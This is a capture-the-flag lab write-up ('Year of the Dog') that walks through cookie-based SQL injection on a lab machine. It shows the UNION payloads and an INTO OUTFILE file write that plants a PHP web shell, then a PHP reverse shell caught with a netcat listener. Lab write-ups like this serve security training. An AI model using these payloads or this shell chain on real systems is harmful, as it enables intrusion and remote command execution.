# YEAR OF THE DOG
![year of the dog banner](https://github.com/user-attachments/assets/a29498fa-0956-4b39-924f-3e4394ee74d6)
##### Lab Name: `Year of the Dog`
##### Difficulty: `Hard`
##### Target IP: `10.49.162.158`

## 1.Scanning
The first step of the assessment was to enumerate the target machine using Nmap in order to identify open ports and running services.

The following command was executed:`sudo nmap -sV -p- 10.49.162.158 --min-rate 1024`

#### Explanation of Flags

  `-sV` : enables service version detection.
  
  `-p-` : scans all 65535 TCP ports.
  
  `--min-rate 1024` : ensures that at least 1024 packets per second are sent,     speeding up the scan.

![nmap scan](https://github.com/user-attachments/assets/d21f78d9-518d-411f-a2eb-95617341cd66)

The scan revealed two open ports:
  - 22/tcp – OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
  - 80/tcp – Apache httpd 2.4.29

Port 80 indicated the presence of a web application, which became the primary attack surface for further testing.

## 2. Web Enumeration
#### 2.1 Manual Inspection
The website was accessed through a browser.
The homepage did not display any useful or sensitive information. The page source code was reviewed for hidden comments or credentials, but no relevant data was found. Since manual inspection did not reveal any obvious vulnerabilities, deeper analysis was performed using Burp Suite.

![ytd_webenum](https://github.com/user-attachments/assets/b0455a25-56ea-4c27-864b-a9c3315fadea)



## 3. Identifying SQL Injection
Burp Suite was used to intercept HTTP traffic. The captured request was sent to the Repeater tab to allow manual modification and testing.

During analysis, a cookie parameter was identified `Cookie: id=fb7afe36b2ecdd97e3c1f2a4f59652a8`

The cookie value appeared to be processed by the backend database, making it a potential injection point.
To test for SQL injection, a single quote (`'`) was appended to the cookie value. This resulted in a SQL syntax error in the server response, confirming that the application was vulnerable to SQL Injection.

![burp request capture](https://github.com/user-attachments/assets/a54a6661-659e-4dad-8307-b82ee2bdab70)

## 4. Exploiting SQL Injection
#### 4.1 Identifying Number of Columns
To determine the number of columns in the underlying SQL query, the following payload was used:`' ORDER BY 2 -- -`

The application returned a valid response, indicating that the query contained at least two columns.

![burp_orderby](https://github.com/user-attachments/assets/dbadb937-bf09-4db3-809b-bbfa600fd28f)

#### 4.2 Verifying UNION-Based Injection
To confirm UNION-based SQL injection and determine which column reflected user input, the following payload was used:
`' UNION SELECT NULL,'a' -- -`
The character 'a' was reflected in the response, confirming a successful UNION-based injection and identifying the injectable column.

![null&#39;a&#39;](https://github.com/user-attachments/assets/def8d3a9-0432-46cb-9e17-03847418471f)


#### 4.3 Enumerating Database Tables

To enumerate available tables in the database, the information_schema.tables table was queried using:

`'UNION SELECT table_name,NULL FROM information_schema.tables -- -`
This allowed the extraction of table names from the database.

![chech information_schema](https://github.com/user-attachments/assets/402b8194-4193-4501-a531-36950ea67c67)


## 5. Arbitrary File Write via INTO OUTFILE

After confirming SQL injection, the next step was to test whether the vulnerability could be escalated to arbitrary file write using the MySQL INTO OUTFILE functionality.
A test file (text.txt) was successfully written to the web directory and was accessible through the browser.
This confirmed that the database user had file write privileges.

![outgile](https://github.com/user-attachments/assets/aa6a2fb2-bfd8-4737-b4f2-248494a8b49d)
![upload text file ](https://github.com/user-attachments/assets/6020bdfe-677d-4639-b89e-d9b3c6e52b7c)


## 6. Uploading a Web Shell

A simple PHP web shell was prepared:`<?php system($_GET['cmd']); ?>`
The PHP code was converted into hexadecimal format and written to the web directory using SQL injection with the UNHEX() function. The file was saved as: `text.php`

Once accessed through the browser, it allowed execution of system commands via URL parameters. This confirmed remote command execution capability.
![text php](https://github.com/user-attachments/assets/5f45585c-7b1a-4040-a75a-e1648108c87a)
![text_php visible on browser](https://github.com/user-attachments/assets/bac64aca-d75a-4b10-a246-0da88eb63eb8)
![execute any command](https://github.com/user-attachments/assets/89b4bb3e-a3bd-4bed-9523-69781d3e9a73)


## 7. Gaining Reverse Shell Access

To obtain a fully interactive shell, a reverse shell was deployed. The PHP reverse shell located at: `/usr/share/webshells/php/php-reverse-shell.php`
was modified with the attacker's IP address and listening port.
A Python HTTP server was started to host the file:
`python3 -m http.server 8000`
The reverse shell file was uploaded to the target server.

![uploadphp-reverse-shell](https://github.com/user-attachments/assets/457d2dcb-ac2c-438c-8f58-efebd28e38ac)

A Netcat listener was started on the attacker machine:`nc -lvnp 4444`
Once the reverse shell file was accessed through the browser, a reverse connection was established, and an interactive shell was obtained on the target system.

![Screenshot 2026-02-28 162901](https://github.com/user-attachments/assets/695d5c40-1563-4824-bca4-04c753904ebe)


![gain shell access](https://github.com/user-attachments/assets/82940ec1-88a5-4c9a-a5dc-8999964b61a6)




